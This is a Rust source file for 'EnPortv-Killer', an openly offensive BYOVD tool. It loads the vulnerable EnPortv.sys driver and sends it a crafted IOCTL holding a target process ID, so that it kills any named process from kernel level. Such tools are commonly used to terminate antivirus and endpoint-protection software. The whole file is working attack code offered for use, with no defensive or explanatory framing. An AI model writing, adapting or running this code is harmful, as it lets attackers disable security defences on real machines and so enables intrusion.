use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - EnPortv
// ============================================================================

struct EnPortv;

impl DriverConfig for EnPortv {
    fn driver_name(&self) -> &str {
        "EnPortv"
    }

    fn driver_file(&self) -> &str {
        "EnPortv.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\EnPortv"
    }

    fn ioctl_code(&self) -> u32 {
        0x00223078
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        let mut buf = vec![0u8; 0x10];
        let self_pid = std::process::id();
        buf[0..4].copy_from_slice(&self_pid.to_ne_bytes());
        buf[8..12].copy_from_slice(&pid.to_ne_bytes());
        buf
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "EnPortv-Killer", version, author = "BlackSnufkin, wwwab")]
#[command(about = "BYOVD process killer using EnPortv driver")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&EnPortv, &cli.process_name, None)
}
